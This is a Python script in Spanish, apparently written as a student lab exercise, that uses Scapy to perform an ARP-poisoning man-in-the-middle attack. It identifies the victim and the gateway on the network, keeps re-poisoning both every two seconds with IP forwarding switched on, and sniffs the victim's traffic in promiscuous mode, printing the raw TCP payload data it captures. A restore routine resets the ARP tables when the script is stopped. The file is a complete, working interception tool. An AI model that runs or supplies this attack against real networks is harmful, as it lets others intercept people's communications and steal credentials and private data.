#!/usr/bin/env python3
# ============================================
# ARP MitM Attack Script
# Autor: Sael German Garcia
# Matricula: 2025-0725
# Descripcion: Ataque Man-in-the-Middle via
#              ARP Poisoning / ARP Spoofing
# ============================================

from scapy.all import *
import sys
import time
import threading
import os

INTERFACE = "ens4"
VICTIM_IP  = "10.7.25.3"
GATEWAY_IP = "10.7.25.1"

def get_mac(ip, iface):
    print(f"[*] Resolviendo MAC de {ip}...")
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface, timeout=3, verbose=0
    )
    if ans:
        mac = ans[0][1].hwsrc
        print(f"[+] {ip} → {mac}")
        return mac
    print(f"[-] No se pudo resolver {ip}")
    sys.exit(1)

def poison(victim_ip, victim_mac, spoof_ip, iface):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(pkt, iface=iface, verbose=0)

def restore(victim_ip, victim_mac, real_ip, real_mac, iface):
    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
              psrc=real_ip, hwsrc=real_mac)
    send(pkt, count=5, iface=iface, verbose=0)

def enable_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding habilitado")

def disable_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def sniff_traffic(iface, victim_ip):
    print(f"[*] Sniffing activo — capturando paquetes de {victim_ip}\n")

    def show_packet(pkt):
        if pkt.haslayer(IP):
            src  = pkt[IP].src
            dst  = pkt[IP].dst
            proto = {1:"ICMP", 6:"TCP", 17:"UDP"}.get(pkt[IP].proto, "?")
            info = ""
            if pkt.haslayer(ICMP):
                info = f"ICMP type={pkt[ICMP].type}"
            elif pkt.haslayer(TCP):
                info = f"TCP {pkt[TCP].sport}→{pkt[TCP].dport}"
                if pkt.haslayer(Raw):
                    data = pkt[Raw].load
                    try:
                        info += f" DATA: {data[:60].decode(errors='replace')}"
                    except:
                        pass
            elif pkt.haslayer(UDP):
                info = f"UDP {pkt[UDP].sport}→{pkt[UDP].dport}"
            print(f"  [>>] {src:15} → {dst:15} | {proto:4} | {info}")

        elif pkt.haslayer(ARP):
            arp = pkt[ARP]
            if arp.op == 1:
                print(f"  [ARP] WHO HAS {arp.pdst}? Tell {arp.psrc}")
            elif arp.op == 2:
                print(f"  [ARP] {arp.psrc} IS AT {arp.hwsrc} → enviado a {arp.pdst}")

    sniff(iface=iface,
          filter=f"ip host {victim_ip} or arp",
          prn=show_packet,
          store=0,
          promisc=True)

def arp_mitm(iface, victim_ip, gateway_ip):
    print("="*55)
    print("  ARP MitM Attack")
    print("  Autor: Sael German Garcia")
    print("  Matricula: 2025-0725")
    print("="*55)
    print(f"[*] Interfaz  : {iface}")
    print(f"[*] Victima   : {victim_ip}")
    print(f"[*] Gateway   : {gateway_ip}")
    print()

    enable_forwarding()

    victim_mac  = get_mac(victim_ip,  iface)
    gateway_mac = get_mac(gateway_ip, iface)

    print()
    print(f"[+] MAC Victima  : {victim_mac}")
    print(f"[+] MAC Gateway  : {gateway_mac}")
    print()

    # Mostrar tabla ARP actual del atacante
    print("[*] Tabla ARP actual del atacante:")
    os.system("arp -n | grep '10.7'")
    print()

    print("[*] Iniciando envenenamiento ARP (cada 2 seg)...")
    print("[*] Presiona Ctrl+C para detener y restaurar\n")

    sniff_thread = threading.Thread(
        target=sniff_traffic,
        args=(iface, victim_ip),
        daemon=True
    )
    sniff_thread.start()

    packets_sent = 0
    try:
        while True:
            poison(victim_ip,  victim_mac,  gateway_ip, iface)
            poison(gateway_ip, gateway_mac, victim_ip,  iface)
            packets_sent += 2
            if packets_sent % 20 == 0:
                print(f"  [*] ARP replies enviados: {packets_sent}")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[!] Deteniendo ataque...")
        print("[*] Restaurando tablas ARP...")
        restore(victim_ip,  victim_mac,  gateway_ip, gateway_mac, iface)
        restore(gateway_ip, gateway_mac, victim_ip,  victim_mac,  iface)
        disable_forwarding()
        print("[+] Tablas ARP restauradas.")
        print(f"[+] Total ARP replies enviados: {packets_sent}")

if __name__ == "__main__":
    victim_ip  = sys.argv[1] if len(sys.argv) > 1 else VICTIM_IP
    gateway_ip = sys.argv[2] if len(sys.argv) > 2 else GATEWAY_IP
    arp_mitm(INTERFACE, victim_ip, gateway_ip)
